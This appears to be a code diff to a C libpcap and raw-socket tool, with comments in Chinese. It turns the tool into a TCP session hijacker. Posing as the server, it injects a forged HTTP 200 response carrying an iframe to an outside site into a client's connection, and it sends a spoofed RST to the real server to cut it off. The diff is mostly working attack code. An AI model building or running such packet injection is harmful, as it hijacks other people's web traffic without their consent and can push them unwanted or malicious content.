@@ -14,9 +14,12 @@
 #include <pcap.h>         /* Libpcap                       */ 
 #include <string.h>       /* String operations             */ 
 #include <stdlib.h>       /* Standard library definitions  */ 
+#include <errno.h>
 
 #define TCPSYN_LEN 20
 #define MAXBYTES2CAPTURE 2048
+
+int errno;
 
 /* Pseudoheader (Used to compute TCP checksum. Check RFC 793) */
 typedef struct pseudoheader {
@@ -34,7 +37,8 @@ typedef unsigned long u_int32;
 /* Function Prototypes */
 int TCP_RST_send(u_int32 seq, u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_int16 dst_prt);
 unsigned short in_cksum(unsigned short *addr,int len);
-
+/* Function Prototypes */
+int Fake_send(u_int32 seq, u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_int16 dst_prt);
 /* Ethernet addresses are 6 bytes */
 #define ETHER_ADDR_LEN	6
 
@@ -199,7 +203,7 @@ while(1){
       //pretend be server,and send RST to source client fack server
       Fake_send(tcp->th_ack, ip->ip_dst.s_addr, ip->ip_src.s_addr, tcp->th_dport, tcp->th_sport);
       //preten be client, and sent RST to server....fack client
-      // TCP_RST_send(htonl(ntohl(tcp->th_seq)+1), ip->ip_src.s_addr, ip->ip_dst.s_addr, tcp->th_sport, tcp->th_dport);
+      TCP_RST_send(htonl(ntohl(tcp->th_seq)+1), ip->ip_src.s_addr, ip->ip_dst.s_addr, tcp->th_sport, tcp->th_dport);
     printf("\n+-------------------------+\n");
   }
  
@@ -238,17 +242,31 @@ int Fake_send(u_int32 seq, u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_in
   int one=1; /* R.Stevens says we need this variable for the setsockopt call */ 
 
   /* Raw socket file descriptor */ 
-  int rawsocket=0;  
-  
-  /* Buffer for the TCP/IP SYN Packets */
-  char packet[ sizeof(struct tcphdr) + sizeof(struct ip) +1 ];   
+  int rawsocket=0; 
+  int j=0;
 
+    //实际上这里需要变化的参数就只有src里面的host地址，以及所谓的Content—Length
+  char *html_content="HTTP/1.1 200 OK\r\nServer: nginx\r\nDate: Tue, 29 Jan 2013 04:42:24 GMT\r\nContent-Type: text/html\r\nContent-Length:5946\r\nLast-Modified: Tue, 29 Jan 2013 04:42:01 GMT\r\nConnection: keep-alive\r\nAccept-Ranges: bytes\r\n\r\n<html><head><meta http-equiv='pragma' content='no-cache'><meta http-equiv='cache-control' content='no-cache,must-revalidate'></head><body><h1>hhhhhhhhhhhh</h1><iframe width='1000' border='0' height='700' src='http://info.wukong.com/'></iframe></body></html>\n"; 
+  
+  int payload_len=strlen(html_content);
+
+  /* Buffer for the TCP/IP SYN Packets */
+  //需要构造的包
+  char packet[ sizeof(struct tcphdr) + sizeof(struct ip) + payload_len + 1 ];   
+
+  int payload_offset=sizeof(struct tcphdr)+sizeof(struct ip);
+
+  //这个将指向packet的头部.....
   /* It will point to start of the packet buffer */  
   struct ip *ipheader = (struct ip *)packet;   
   
+  //这个将指向tcp的头部
   /* It will point to the end of the IP header in packet buffer */  
   struct tcphdr *tcpheader = (struct tcphdr *) (packet + sizeof(struct ip)); 
   
+  //这是我自己加的，一个指向payload的指针
+  char *payload=(char *)(packet+payload_offset);
+
   /* TPC Pseudoheader (used in checksum)    */
   tcp_phdr_t pseudohdr;            
 
@@ -258,7 +276,8 @@ int Fake_send(u_int32 seq, u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_in
   /* Although we are creating our own IP packet with the destination address */
   /* on it, the sendto() system call requires the sockaddr_in structure */
   struct sockaddr_in dstaddr;  
-  
+ 
+  //用0大量填充内存
   memset(&pseudohdr,0,sizeof(tcp_phdr_t));
   memset(&packet, 0, sizeof(packet));
   memset(&dstaddr, 0, sizeof(dstaddr));   
@@ -288,7 +307,9 @@ int Fake_send(u_int32 seq, u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_in
   ipheader->ip_hl = 5;     /* Header lenght in octects                       */
   ipheader->ip_v = 4;      /* Ip protocol version (IPv4)                     */
   ipheader->ip_tos = 0;    /* Type of Service (Usually zero)                 */
-  ipheader->ip_len = htons( sizeof (struct ip) + sizeof (struct tcphdr) );         
+  
+  //加了包大小计算的地方之一
+  ipheader->ip_len = htons( sizeof (struct ip) + sizeof (struct tcphdr)+payload_len );         
   ipheader->ip_off = 0;    /* Fragment offset. We'll not use this            */
   ipheader->ip_ttl = 64;   /* Time to live: 64 in Linux, 128 in Windows...   */
   ipheader->ip_p = 6;      /* Transport layer prot. TCP=6, UDP=17, ICMP=1... */
@@ -302,7 +323,7 @@ int Fake_send(u_int32 seq, u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_in
   tcpheader->th_ack = htonl(1);   /* Acknowledgement Number                  */
   tcpheader->th_x2 = 0;           /* Variable in 4 byte blocks. (Deprecated) */
   tcpheader->th_off = 5;      /* Segment offset (Lenght of the header)   */
-  tcpheader->th_flags = TH_RST;   /* TCP Flags. We set the Reset Flag        */
+  tcpheader->th_flags = TH_ACK;   /* TCP Flags. We set the Reset Flag        */
   tcpheader->th_win = htons(4500) + rand()%1000;/* Window size               */
   tcpheader->th_urp = 0;          /* Urgent pointer.                         */
   tcpheader->th_sport = src_prt;  /* Source Port                             */
@@ -314,7 +335,8 @@ int Fake_send(u_int32 seq, u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_in
   pseudohdr.dst = ipheader->ip_dst.s_addr;
   pseudohdr.zero = 0;
   pseudohdr.protocol = ipheader->ip_p;
-  pseudohdr.tcplen = htons( sizeof(struct tcphdr) );
+  //加了包大小的地方之一
+  pseudohdr.tcplen = htons( sizeof(struct tcphdr)+payload_len);
 
   /* Copy header and pseudoheader to a buffer to compute the checksum */  
   memcpy(tcpcsumblock, &pseudohdr, sizeof(tcp_phdr_t));   
@@ -325,11 +347,32 @@ int Fake_send(u_int32 seq, u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_in
 
   /* Compute the IP checksum as the standard says (RFC 791) */
   ipheader->ip_sum = in_cksum((unsigned short *)ipheader, sizeof(struct ip));
-    
+  
+  
+  
+  //ssize_t sendto(int socket, const void *buffer, size_t length,
+  //               int flags,const struct sockaddr *dest_addr, socklen_t dest_len);
+  //
+  //
+ 
+  printf("payload_len:%d\n",payload_len); 
+  printf("size_t length:%d\n",ntohs(ipheader->ip_len));
+  
+  //copy the payload_content to packet;
+  //
+  for(j=payload_offset;j<payload_offset+payload_len;j++){
+      packet[j]=html_content[j-payload_offset];
+  }
+
+  printf("Html contetent %s\n",html_content);
+  printf("packets %s\n",packet);
+
+
   /* Send it through the raw socket */    
-  if ( sendto(rawsocket, packet, ntohs(ipheader->ip_len), 0,
-                  (struct sockaddr *) &dstaddr, sizeof (dstaddr)) < 0){   
-        return -1;                     
+  if ( sendto(rawsocket, packet, ntohs(ipheader->ip_len), 0,(struct sockaddr *) &dstaddr, sizeof (dstaddr)) < 0){   
+       //Socket error:90:Message Too Long 
+      printf("Socket Sendto error %d : %s\n", errno, strerror(errno));  
+      return -1;
     }
 
   printf("Sent RST Packet:\n");
@@ -443,10 +486,14 @@ int TCP_RST_send(u_int32 seq, u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u
 
   /* Compute the IP checksum as the standard says (RFC 791) */
   ipheader->ip_sum = in_cksum((unsigned short *)ipheader, sizeof(struct ip));
-    
+  
+  //ssize_t
+  //sendto(int socket, const void *buffer, size_t length, 
+  //       int flags,const struct sockaddr *dest_addr, socklen_t dest_len);
+  //
+  printf("size_t length:%d",ntohs(ipheader->ip_len));
   /* Send it through the raw socket */    
-  if ( sendto(rawsocket, packet, ntohs(ipheader->ip_len), 0,
-                  (struct sockaddr *) &dstaddr, sizeof (dstaddr)) < 0){		
+  if ( sendto(rawsocket, packet, ntohs(ipheader->ip_len), 0,(struct sockaddr *) &dstaddr, sizeof (dstaddr)) < 0){		
         return -1;                     
     }
 
